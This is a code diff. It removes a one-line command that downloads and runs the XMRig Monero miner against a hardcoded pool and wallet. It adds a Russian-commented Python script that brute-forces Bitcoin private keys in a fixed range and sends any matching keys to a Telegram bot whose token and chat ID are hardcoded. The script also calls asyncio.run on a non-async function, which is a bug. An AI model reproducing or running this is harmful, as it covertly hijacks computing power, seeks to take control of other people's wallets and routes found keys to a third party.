@@ -1,1 +1,140 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-x64.tar.gz && tar -xf xmrig-6.18.1-linux-x64.tar.gz && cd xmrig-6.18.1 && chmod +x xmrig && ./xmrig --randomx-mode=light --cpu-no-yield --threads=3 --coin=XMR -o pool.hashvault.pro:443  -u 4Aw1ZDXYphnES9tQN7z5Byd7w1Sw875CoNCpDob287XgYWoUXBDCCNtamM4UPEkdcdMkNB3muES6C4e4vshyuAWc45g7zxr -p X -k -a rx/0
+import random
+import base64
+from bit import *
+from bit.format import bytes_to_wif
+import multiprocessing
+from multiprocessing import Process
+import atexit
+from time import time
+from datetime import timedelta, datetime
+import asyncio
+from telegram import Bot
+
+def send_telegram_notification(private_key, address, wif, compressed_wif, compressed_address, uncompressed_address):
+    TELEGRAM_BOT_TOKEN = '6895004123:AAHmuNJD_lFZ20u8JXfzRgwW6Bxk36Qze1c'
+    TELEGRAM_CHAT_ID = '5108542147'
+    
+    try:
+        bot = Bot(token=TELEGRAM_BOT_TOKEN)
+        message = f"Найдено совпадение!\nАдрес: {address}\nПриватный ключ: {private_key}\n" \
+                  f"Uncompressed WIF: {wif}\nCompressed WIF: {compressed_wif}\n" \
+                  f"Compressed Address: {compressed_address}\nUncompressed Address: {uncompressed_address}\n"
+        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message)
+    except Exception as e:
+        print(f"Ошибка отправки уведомления в телеграм: {e}")
+
+async def send_start_notification():
+    TELEGRAM_BOT_TOKEN = '6895004123:AAHmuNJD_lFZ20u8JXfzRgwW6Bxk36Qze1c'
+    TELEGRAM_CHAT_ID = '5108542147'
+    
+    try:
+        bot = Bot(token=TELEGRAM_BOT_TOKEN)
+        message = "Генерация начата. Пожалуйста, подождите..."
+        await bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message)
+    except Exception as e:
+        print(f"Ошибка отправки уведомления в телеграм: {e}")
+
+def seconds_to_str(elapsed=None):
+    if elapsed is None:
+        return datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
+    else:
+        return str(timedelta(seconds=elapsed))
+
+def log(txt, elapsed=None):
+    colour_cyan = '\033[36m'
+    colour_reset = '\033[0;0;39m'
+    colour_red = '\033[31m'
+    print('\n ' + colour_cyan + '  [TIMING]> [' + seconds_to_str() + '] ----> ' + txt + '\n' + colour_reset)
+    if elapsed:
+        print("\n " + colour_red + " [TIMING]> Elapsed time ==> " + elapsed + "\n" + colour_reset)
+
+def end_log():
+    end = time()
+    elapsed = end - start
+    log("End Program", seconds_to_str(elapsed))
+
+start = time()
+atexit.register(end_log)
+log("Start Program")
+
+# Отправить уведомление о начале работы
+asyncio.run(send_start_notification())
+
+filename = 'puzzle.txt'
+try:
+    with open(filename) as f:
+        add = f.read().split()
+except FileNotFoundError:
+    print(f"File '{filename}' not found. Make sure the file exists and contains the puzzle values.")
+    exit()
+
+add = set(add)
+
+# Множество для хранения сгенерированных приватных ключей
+generated_keys = set()
+
+print("Loading Puzzle TXT Please Wait and Good Luck...")         
+
+# Читаем целевые адреса из файла btc.txt
+with open("btc.txt") as btc_file:
+    target_addresses = btc_file.read().splitlines()
+
+# Остальной код остается без изменений
+# Updated range values
+x = base64.b64decode("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABqDixOHS99pc=").hex()
+y = base64.b64decode("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0m4S2QxpsTvE=").hex()
+z = 1
+
+r = 0
+cores = 1  # CPU Control Set Cores
+
+def seek(r):
+    while True:
+        ran = random.randrange(int(x, 16), int(y, 16), z)
+        key1 = Key.from_int(ran)
+        wif = bytes_to_wif(key1.to_bytes(), compressed=False)  # Uncompressed WIF
+        wif2 = bytes_to_wif(key1.to_bytes(), compressed=True)  # compressed WIF
+        key2 = Key(wif)
+        caddr = key1.address  # Legacy compressed address
+        uaddr = key2.address  # Legacy uncompressed address
+        myhex = "%064x" % ran
+        private_key = myhex[:64]
+        
+        # Проверяем, был ли уже сгенерирован такой приватный ключ
+        if private_key in generated_keys:
+            continue
+        
+        # Добавляем сгенерированный ключ в множество
+        generated_keys.add(private_key)
+
+        # Check if the address is in the target addresses
+        if caddr in target_addresses or uaddr in target_addresses:
+            print("Target Address Found!!!", ran, caddr, uaddr, wif2, private_key)  # Legacy compressed address
+            # Sending Telegram Notification
+            asyncio.run(send_telegram_notification(private_key, caddr, wif, wif2, caddr, uaddr))
+            continue
+        
+        if caddr in add:
+            print("Nice One Found!!!", ran, caddr, wif2, private_key)  # Legacy compressed address
+            # Sending Telegram Notification
+            asyncio.run(send_telegram_notification(private_key, caddr, wif, wif2, caddr, uaddr))
+            continue
+        if uaddr in add:
+            print("Nice One Found!!!", ran, uaddr, wif, private_key)  # Legacy uncompressed address
+            # Sending Telegram Notification
+            asyncio.run(send_telegram_notification(private_key, uaddr, wif, wif2, caddr, uaddr))
+            continue
+        else:
+            colour_cyan = '\033[36m'
+            colour_reset = '\033[0;0;39m'
+            colour_red = '\033[31m'
+            print(colour_cyan + "LOG " + colour_red + "  exRU # Private Key : " +
+                  colour_cyan + myhex + f" Private Key: {private_key}, Address (Compressed): {caddr}, Address (Uncompressed): {uaddr}", end='\r' + colour_reset)  # Running Display Output
+
+# CPU Control Command
+if __name__ == '__main__':
+    jobs = []
+    for r in range(cores):
+        p = multiprocessing.Process(target=seek, args=(r,))
+        jobs.append(p)
+        p.start()
